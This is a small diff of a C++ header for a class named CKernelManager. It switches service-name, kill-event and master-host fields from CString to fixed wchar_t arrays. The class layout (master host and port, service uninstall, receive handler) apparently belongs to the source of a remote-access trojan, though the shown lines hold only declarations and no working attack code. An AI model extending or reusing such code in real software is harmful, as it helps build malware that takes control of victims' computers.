@@ -9,12 +9,12 @@ public:
 		LPCTSTR lpszKillEvent, LPCTSTR lpszMasterHost, UINT nMasterPort);
 	virtual ~CKernelManager();
 	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
-	//char	m_strServiceName[256];
-	CString m_strServiceName;
-	//char	m_strKillEvent[256];
-	CString m_strKillEvent ;
-	//static	char	m_strMasterHost[256];
-	static CString  m_strMasterHost;
+	wchar_t	m_strServiceName[256];
+	//CString m_strServiceName;
+	wchar_t	m_strKillEvent[256];
+	//CString m_strKillEvent ;
+	static	wchar_t	m_strMasterHost[256];
+	//static CString  m_strMasterHost;
 	static	UINT	m_nMasterPort;
 	void	UnInstallService();
 	bool	IsActived();
